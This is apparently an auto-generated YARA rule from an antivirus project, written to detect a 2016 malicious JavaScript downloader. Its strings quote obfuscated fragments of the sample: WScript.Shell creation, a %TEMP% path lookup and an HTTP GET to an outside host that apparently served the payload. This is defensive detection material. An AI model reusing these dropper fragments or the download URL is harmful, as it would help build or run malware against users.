rule sig_20160427_a089ddbd66301d05cb4410d6b3b189ac {
  meta:
    description = "datamaliciousorder - file 20160427_a089ddbd66301d05cb4410d6b3b189ac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "08a1f917824237ecfd135b1a745b662c0a660c3fe8ae9afe393e18b378c8fe5d"

  strings:
    $s1  = "function UxshgIuhcu() {return LsxwcGnjtj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"bAOxJsX" ascii
    $s2  = "function UxshgIuhcu() {return LsxwcGnjtj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"bAOxJsX" ascii
    $s3  = "function QkbaiBopue(TbikrYqzrh, XifyiSomcb){FlctaRiyzs = FlctaRiyzs * 1; return TbikrYqzrh - XifyiSomcb;};" fullword ascii
    $s4  = "var IsywoSndwq = this[\"WScript\"];" fullword ascii
    $s5  = "var LsxwcGnjtj = function TnamkLxxlo() {return IsywoSndwq[JcajjWnxhh](\"WScript\"+\".Shell\");}(), ImrlwMjojd = 11;" fullword ascii
    $s6  = "if (ZrpisWebyk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "ZrpisWebyk[VrzsiCcmkn](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s8  = "function QfgniWmxfx() {return ((NwwrjZbhdw == true) && (NwwrjZbhdw == BydoeKxiym)) ? 1 : FlctaRiyzs;};" fullword ascii
    $s9  = "RbtrdDaoyr = true;" fullword ascii
    $s10 = "var IwmapDfcqg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "function ByyrkGexte(){return 23;};" fullword ascii
    $s12 = "function RddvyDxqmc(OfoycFdeeo) {var FpradOqhkp = (1, 2, 3, 4, 5, OfoycFdeeo); return FpradOqhkp;};" fullword ascii
    $s13 = "BydoeKxiym = true; " fullword ascii
    $s14 = "}while (AaujkKyrgi);" fullword ascii
    $s15 = "var BydoeKxiym = false;" fullword ascii
    $s16 = "NwwrjZbhdw = true; " fullword ascii
    $s17 = "function TrfaoCnbwa()" fullword ascii
    $s18 = "return QkbaiBopue(ZignlZpwyv, UaucjFbxvm);" fullword ascii
    $s19 = "var RbtrdDaoyr = false;" fullword ascii
    $s20 = "function EpjwgGoehq(){return RfricAbbnv + \"\";};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}